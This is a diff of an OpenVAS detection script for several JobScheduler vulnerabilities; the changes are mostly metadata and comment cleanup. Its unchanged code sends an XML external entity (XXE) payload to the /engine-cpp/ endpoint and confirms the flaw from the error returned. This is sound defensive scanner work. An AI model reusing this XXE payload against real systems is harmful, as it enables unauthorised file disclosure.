@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_jobscheduler_mult_vuln_oct14.nasl 6759 2017-07-19 09:56:33Z teissa $
+# $Id: gb_jobscheduler_mult_vuln_oct14.nasl 11108 2018-08-24 14:27:07Z mmartin $
 #
 # JobScheduler Multiple Vulnerabilities - Oct14
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804773");
-  script_version("$Revision: 6759 $");
+  script_version("$Revision: 11108 $");
   script_cve_id("CVE-2014-5391", "CVE-2014-5392", "CVE-2014-5393");
   script_bugtraq_id(69660, 69664, 69661);
   script_tag(name:"cvss_base", value:"5.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-19 11:56:33 +0200 (Wed, 19 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
   script_tag(name:"creation_date", value:"2014-10-09 10:33:16 +0530 (Thu, 09 Oct 2014)");
 
   script_name("JobScheduler Multiple Vulnerabilities - Oct14");
@@ -61,9 +61,9 @@ if(description)
   script_tag(name:"solution", value:"Upgrade to version 1.6.4246 or 1.7.4241 or later,
   For updates refer http://www.sos-berlin.com/modules/cjaycontent/index.php?id=osource_scheduler_introduction_en.htm");
 
-  script_xref(name : "URL" , value : "http://www.sos-berlin.com/modules/news/article.php?storyid=73");
-  script_xref(name : "URL" , value : "http://www.sos-berlin.com/modules/news/article.php?storyid=74");
-  script_xref(name : "URL" , value : "http://www.christian-schneider.net/advisories/CVE-2014-5392.txt");
+  script_xref(name:"URL", value:"http://www.sos-berlin.com/modules/news/article.php?storyid=73");
+  script_xref(name:"URL", value:"http://www.sos-berlin.com/modules/news/article.php?storyid=74");
+  script_xref(name:"URL", value:"http://www.christian-schneider.net/advisories/CVE-2014-5392.txt");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
@@ -83,17 +83,10 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-## Variable Initialization
-sndReq = "";
-rcvRes = "";
-http_port = "";
-
-## Get HTTP Port
 http_port = get_http_port(default:40444);
 
 host = http_host_name(port:http_port);
 
-## Iterate over possible paths
 foreach dir (make_list_unique("/", "/jobscheduler", "/job-scheduler", "/scheduler", cgi_dirs(port:http_port)))
 {
 
@@ -102,30 +95,24 @@ foreach dir (make_list_unique("/", "/jobscheduler", "/job-scheduler", "/schedule
   sndReq = http_get(item: string(dir, "/operations_gui/"),  port:http_port);
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
-  ## confirm the Application
   if(">JobScheduler<" >< rcvRes)
   {
     entity =  rand_str(length:8,charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
 
-    ## Construct attack request
     url = dir + '/engine-cpp/';
 
-    ## Construct post data
     postData = '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///' + entity +
                '" >]><commands><show_state subsystems="job folder" what="folders no_subfolders' +
                ' " path="/sos/update" max_task_history="0"/>&xxe;</commands>';
 
-    ## Construct the POST request
     sndReq = string("POST ", url, " HTTP/1.1\r\n",
                     "Host: ", host, "\r\n",
                     "X-Requested-With: XMLHttpRequest\r\n",
                     "Content-Length: ", strlen(postData), "\r\n",
                     "\r\n", postData);
 
-    ## Send request and receive the response
     rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:TRUE);
 
-    ## Confirm exploit worked by checking the response
     if("The system cannot find the file specified" >< rcvRes &&
        "DOCTYPE is disallowed" >!< rcvRes)
     {
